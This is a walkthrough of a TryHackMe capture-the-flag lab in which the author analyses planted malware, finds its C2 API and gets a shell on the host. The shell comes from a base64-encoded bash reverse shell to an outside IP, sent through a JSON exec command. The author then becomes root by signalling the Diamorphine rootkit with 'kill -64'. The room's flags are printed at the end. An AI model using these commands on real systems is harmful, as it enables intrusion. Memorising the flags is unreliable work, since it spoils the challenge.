
# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 80   | HTTP    |


# RECONNAISSANCE
---

We need to add `takedown.thm.local` to `/etc/hosts`:

```bash
echo 'IP takedown.thm.local' | sudo tee -a /etc/hosts
```


![Pasted image 20250711173341.png](../../IMAGES/Pasted%20image%2020250711173341.png)

`robots.txt` entrance is allowed, let's check it up:

![Pasted image 20250711173345.png](../../IMAGES/Pasted%20image%2020250711173345.png)

`/favicon.ico` appears here, which is weird, let's check it up:

![Pasted image 20250711173354.png](../../IMAGES/Pasted%20image%2020250711173354.png)

```bash
file favicon.ico
favicon.ico: PE32+ executable for MS Windows 5.02 (GUI), x86-64, 17 sections
```

The file is a `PE32+ executable`, at the start of the room, we were provided with a pdf file which contains this:

![Pasted image 20250711173403.png](../../IMAGES/Pasted%20image%2020250711173403.png)

Let's check the sha256sum of the file:

```bash
sha256sum favicon.ico
80e19a10aca1fd48388735a8e2cfc8021724312e1899a1ed8829db9003c2b2dc  favicon.ico
```

Its the same as the image, which means that's the file they used for initial access, let's analyze the binary, we can use `binary ninja`

![Pasted image 20250711173412.png](../../IMAGES/Pasted%20image%2020250711173412.png)

We can see a `/api/agents` call on here, the malicious actor is uploading a file, we can also see this:

![Pasted image 20250711173417.png](../../IMAGES/Pasted%20image%2020250711173417.png)

We've found that they may be a `/api/agents` endpoint, let's save that info for now, if we fuzz, we can find this:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://takedown.thm.local/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://takedown.thm.local/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php .html .txt .git .js
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 198ms]
.html                   [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 199ms]
index.html              [Status: 200, Size: 25844, Words: 6219, Lines: 681, Duration: 198ms]
css                     [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 170ms]
js                      [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 170ms]
readme.txt              [Status: 200, Size: 4763, Words: 546, Lines: 128, Duration: 172ms]
styles.html             [Status: 200, Size: 20907, Words: 4017, Lines: 666, Duration: 171ms]
robots.txt              [Status: 200, Size: 36, Words: 3, Lines: 2, Duration: 172ms]
inc                     [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 170ms]
fonts                   [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 171ms]
```

Let's check all those directories:

![Pasted image 20250711173424.png](../../IMAGES/Pasted%20image%2020250711173424.png)

![Pasted image 20250711173429.png](../../IMAGES/Pasted%20image%2020250711173429.png)

We can see this on the readme.txt file:

![Pasted image 20250711173432.png](../../IMAGES/Pasted%20image%2020250711173432.png)

There's a `ealigam@gmail.com` email, `ealigam` may be an user, let's save that for now.

We can check this on the `images` directory:

![Pasted image 20250711173437.png](../../IMAGES/Pasted%20image%2020250711173437.png)

We got a backup for an image, which is pretty uncommon, even more when we check the name `shutterbug`, it appears on the attackers malware samples let's check it:

```bash
file shutterbug.jpg.bak
shutterbug.jpg.bak: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9e3c7f037a52f26b1982f131013708f59786d773, for GNU/Linux 3.2.0, not stripped
```

The file is a binary too, since this is a Linux binary, let's use `ninja binary` again:

![Pasted image 20250711173442.png](../../IMAGES/Pasted%20image%2020250711173442.png)

We can see another call to `/api/agents` with a weird `User-Agent` header, let's check this up on Caido:

![Pasted image 20250711173446.png](../../IMAGES/Pasted%20image%2020250711173446.png)

Without the right `User-Agent` we get `404`, this happens if we use it:

```
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
```

![Pasted image 20250711173450.png](../../IMAGES/Pasted%20image%2020250711173450.png)

We get `200` status code, let's begin exploitation.



# EXPLOITATION
---

Let's analyze the `cdhd-dxhy-kqck-bnpx` endpoint:

![Pasted image 20250711173454.png](../../IMAGES/Pasted%20image%2020250711173454.png)

We get:

```http
Agent info:
UID: cdhd-dxhy-kqck-bnpx - Hostname: www-infinity
```

The `hostname` command is being executed, if we remember the analysis on the `favicon.ico` file, we got a list of commands that we're able to run, let's check the `/command` endpoint of the API:

![Pasted image 20250711173505.png](../../IMAGES/Pasted%20image%2020250711173505.png)

![Pasted image 20250711173527.png](../../IMAGES/Pasted%20image%2020250711173527.png)

We get `whoami` which means that RCE is possible through modifying the request, we can achieve rce by sending the request with a `json` content which points to a reverse shell, let's create the reverse shell first:

```bash
echo 'sh -i >& /dev/tcp/10.14.21.28/4444 0>&1' | base64
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTQuMjEuMjgvNDQ0NCAwPiYxCg==
```

Now, we need to set the `Content-Type` header to `application/json` and send this:

```json
{
	"cmd":"exec echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTQuMjEuMjgvNDQ0NCAwPiYxCg== | base64 -d | bash"
}
```

We also need to change the `GET` request to a `POST` request:

![Pasted image 20250711173602.png](../../IMAGES/Pasted%20image%2020250711173602.png)

We point to the `/exec` endpoint because this is one of the commands we can run:

![Pasted image 20250711173614.png](../../IMAGES/Pasted%20image%2020250711173614.png)

After we send the command, if we check our listener, we can see the connection:


![Pasted image 20250711173609.png](../../IMAGES/Pasted%20image%2020250711173609.png)

We got the shell, let' start privesc.

# PRIVILEGE ESCALATION
---

As always, let's stabilize our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250711173625.png](../../IMAGES/Pasted%20image%2020250711173625.png)

Time to use `linpeas`:

![Pasted image 20250711173628.png](../../IMAGES/Pasted%20image%2020250711173628.png)

We got the `id_rsa` of the `webadmin-lowpriv` user available, let's migrate to ssh:

![Pasted image 20250711173632.png](../../IMAGES/Pasted%20image%2020250711173632.png)

If we use `pspy`, we can notice this:

![Pasted image 20250711173637.png](../../IMAGES/Pasted%20image%2020250711173637.png)

Right after we run our shell, a process named:

```
/usr/share/diamorphine_secret/svcgh0st
```

Starts running, if we check the `/usr/share` directory, this doesn't exist:

![Pasted image 20250711173642.png](../../IMAGES/Pasted%20image%2020250711173642.png)

This behavior appears to be similar to a rootkit one, if we search `diamorphine secret`, we can check this:

![Pasted image 20250711173646.png](../../IMAGES/Pasted%20image%2020250711173646.png)

![Pasted image 20250711173653.png](Pasted%20image%2020250711173653.png)

`Diamorphine` is a Linux rootkit, here's the official repo:

https://github.com/m0nad/Diamorphine

![Pasted image 20250711173703.png](../../IMAGES/Pasted%20image%2020250711173703.png)

It says that if we send a `64` signal to any `pid`, we can become root, we can exploit this to become root in our ssh session, let's do:

```
kill -64 $$
```

```bash
webadmin-lowpriv@www-infinity:/tmp$ kill -64 $$
webadmin-lowpriv@www-infinity:/tmp$ id
uid=0(root) gid=0(root) groups=0(root),1001(webadmin-lowpriv)
```

![Pasted image 20250711173708.png](../../IMAGES/Pasted%20image%2020250711173708.png)

There it is, we're now root and can read both flags:

```bash
webadmin-lowpriv@www-infinity:/tmp$ cat /home/webadmin-lowpriv/user.txt
THM{c2_servers_have_vulnerabilities_t00}

webadmin-lowpriv@www-infinity:/tmp$ cat /root/root.txt
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#*****(/****/@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@#***&@/,,,,,,,,%@#***@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@&**#(,,,,,,,,,,,,*,,,,,@**/@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@(**/,,,,,,,,,,,,,,,,,,**,,,,/**@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%**,,,,,,,,,,,,#&@@%*,,,,,,***,,***@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@/**,***,,,,(@/*********/@@,,,,****,**%@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@*******,,,/*,*************,,/#,,,******#@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@******,,,,,,******************,,,,,******(@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@******,,,,,**&@@@@@****(@@@@@&***,,,,******%@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@(*****,,,,/@@@@@@@@@@***@@@@@@@@@@**,,,******@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@*****,,,/@@@@*****%@****/@#****/@@@@/,,,*****/@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@(***,,,,@@@@@@@@@@@***(&(***@@@@@@@@@@@*,,,****@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@***,,,,@&&@@@@@@@%@@@@@@@@@@@#@@@@@@@#&@*,,,***%@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@#**,,,,***@@@@@@@@@@@@@@@@@@@@@@@@@@@@%***,,,****@@@@@@@@@@@@@@@@@
@@@@@@@@@@&****,,,,***/@@@#@@@@@@/*****(@@@@@@%@@@/***,,,******@@@@@@@@@@@@@@@
@@@@@@@@@*******,,,,***@@@@(@@@@@******/@@@@@%@@@%***,,,,*******/@@@@@@@@@@@@@
@@@@@@@@&********,,,****@@@@@*&@@@@#*%@@@@%*@@@@%****,,,*********@@@@@@@@@@@@@
@@@@@@@@@@(********,,****#@@@@&***********@@@@@/****,,,********@@@@@@@@@@@@@@@
@@@@@@@@@@@@%*******,,*****&@(@(*********#@/@%*****,,*******/@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@/******,**,****#@(*******#@/****,**********&@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@/******,,*****@@****/@@*****,,*******&@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@#*****,,*****@@&@&*****,,*****(@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@/***,,***********,,***/@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/**,,*****,,**/@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%/,,,/&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

THANKS FOR PLAYING :D -husky

THM{th3_r00t_of_the_pr0blem}
```

![Pasted image 20250711173715.png](../../IMAGES/Pasted%20image%2020250711173715.png)

![Pasted image 20250711173718.png](../../IMAGES/Pasted%20image%2020250711173718.png)




